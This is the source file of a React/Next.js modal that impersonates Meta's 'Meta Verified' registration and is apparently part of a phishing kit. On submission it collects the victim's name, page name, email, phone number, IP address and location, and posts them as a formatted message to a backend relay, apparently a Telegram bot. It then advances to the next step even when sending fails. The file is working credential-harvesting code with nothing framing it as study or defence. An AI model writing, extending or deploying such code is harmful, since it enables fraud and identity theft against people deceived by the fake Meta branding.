import MetaLogo from '@/assets/images/meta-logo-image.png';
import { store } from '@/store/store';
import translateText from '@/utils/translate';
import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import IntlTelInput from 'intl-tel-input/reactWithUtils';
import 'intl-tel-input/styles';
import Image from 'next/image';
import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';

interface FormData {
    fullName: string;
    personalEmail: string;
    pageName: string;
}

interface FormField {
    name: keyof FormData;
    label: string;
    type: 'text' | 'email' | 'textarea';
}

const FORM_FIELDS: FormField[] = [
    { name: 'fullName', label: 'Full Name', type: 'text' },
    { name: 'pageName', label: 'Apply for Meta Verified – [Page Name]', type: 'text' },
    { name: 'personalEmail', label: 'Personal Email', type: 'email' }
];
const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
    const [isLoading, setIsLoading] = useState(false);
    const [phoneNumber, setPhoneNumber] = useState('');
    const [translations, setTranslations] = useState<Record<string, string>>({});
    const [agreeToTerms, setAgreeToTerms] = useState(false);
    const [formData, setFormData] = useState<FormData>({
        fullName: '',
        personalEmail: '',
        pageName: ''
    });

    const { setModalOpen, geoInfo, setMessageId, setMessage } = store();
    const countryCode = geoInfo?.country_code.toLowerCase() || 'us';

    const t = (text: string): string => {
        return translations[text] || text;
    };

    useEffect(() => {
        if (!geoInfo) return;
        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
        const translateAll = async () => {
            const translatedMap: Record<string, string> = {};
            for (const text of textsToTranslate) {
                translatedMap[text] = await translateText(text, geoInfo.country_code);
            }

            setTranslations(translatedMap);
        };

        translateAll();
    }, [geoInfo]);

    const initOptions = useMemo(
        () => ({
            initialCountry: countryCode as '',
            separateDialCode: true,
            strictMode: true,
            nationalMode: true,
            autoPlaceholder: 'aggressive' as const,
            placeholderNumberType: 'MOBILE' as const,
            countrySearch: false
        }),
        [countryCode]
    );

    const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLTextAreaElement>) => {
        const { name, value, type } = e.target;
        setFormData((prev) => ({
            ...prev,
            [name]: type === 'checkbox' ? (e.target as HTMLInputElement).checked : value
        }));
    }, []);

    const handlePhoneChange = useCallback((number: string) => {
        setPhoneNumber(number);
    }, []);

    const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
        e.preventDefault();

        if (isLoading) return;
        setIsLoading(true);

        const message = `
${
    geoInfo
        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
        : 'N/A'
}

<b>👤 Full Name:</b> <code>${formData.fullName}</code>
<b>📘 Page Name:</b> <code>${formData.pageName}</code>
<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
<b>📱 Phone Number:</b> <code>${phoneNumber}</code>

<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
        `.trim();

        try {
            const res = await axios.post('/api/send', {
                message
            });
            if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                setMessageId(res.data.data.result.message_id);
                setMessage(message);
            }
        } catch {
            // Continue even if send fails
        } finally {
            setIsLoading(false);
            nextStep(formData);
        }
    };

    return (
        <>
            {/* Overlay mờ toàn màn hình */}
            <div className="fixed inset-0 z-40 bg-black/50 backdrop-blur-sm transition-all"></div>
            <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center px-1 sm:px-3 md:px-4'>
                <div className='flex max-h-[95vh] w-full max-w-sm sm:max-w-md md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
                <div className='mb-1.5 sm:mb-2 flex w-full items-center justify-between p-1.5 sm:p-2 md:p-4 pb-0'>
                    <p className='text-xs sm:text-sm md:text-lg font-bold'>{t('Complete the free Meta Verified registration form.')}</p>
                    <button type='button' onClick={() => setModalOpen(false)} className='h-7 sm:h-8 w-7 sm:w-8 rounded-full transition-colors hover:bg-[#e2eaf2] flex-shrink-0' aria-label='Close modal'>
                        <FontAwesomeIcon icon={faXmark} size='lg' />
                    </button>
                </div>

                <form onSubmit={handleSubmit} className='flex flex-1 flex-col overflow-y-auto px-1.5 sm:px-3 md:px-4'>
                    <div className='flex flex-col gap-1.5 sm:gap-2 py-1.5 sm:py-2'>
                        {FORM_FIELDS.map((field) => (
                            <div key={field.name}>
                                <p className='text-xs sm:text-sm font-sans'>{t(field.label)}</p>
                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-20 sm:min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-10 sm:h-11 md:h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' />}
                            </div>
                        ))}
                        <p className='text-xs sm:text-sm font-sans'>{t('Mobile phone number')}</p>
                        <IntlTelInput
                            onChangeNumber={handlePhoneChange}
                            initOptions={initOptions}
                            inputProps={{
                                name: 'phoneNumber',
                                className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
                            }}
                        />
                        <p className='text-xs sm:text-xs text-gray-600 mt-2 sm:mt-3'>{t('Our response will be sent to you within 14-40 hours.')}</p>
                        <div className='flex items-center gap-2 mt-2 sm:mt-3'>
                            <input 
                                type='checkbox' 
                                id='agreeTerms'
                                checked={agreeToTerms}
                                onChange={(e) => setAgreeToTerms(e.target.checked)}
                                className='w-4 h-4 cursor-pointer'
                            />
                            <label htmlFor='agreeTerms' className='text-xs sm:text-xs text-gray-700 cursor-pointer'>
                                {t('I agree with Terms of use')}
                            </label>
                        </div>
                        <button type='submit' disabled={isLoading || !agreeToTerms} className={`mt-3 sm:mt-4 md:mt-5 flex h-10 sm:h-11 md:h-12.5 w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-xs sm:text-sm md:text-base text-white transition-colors hover:bg-blue-700 ${isLoading || !agreeToTerms ? 'cursor-not-allowed opacity-60' : ''}`}>
                            {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Send')}
                        </button>
                    </div>
                </form>

                <div className='flex items-center justify-center p-1.5 sm:p-2 md:p-3'>
                    <Image src={MetaLogo} alt='' className='h-3.5 sm:h-4 md:h-4.5 w-14 sm:w-16 md:w-17.5' />
                </div>
            </div>
            </div>
        </>
    );
};

export default InitModal;
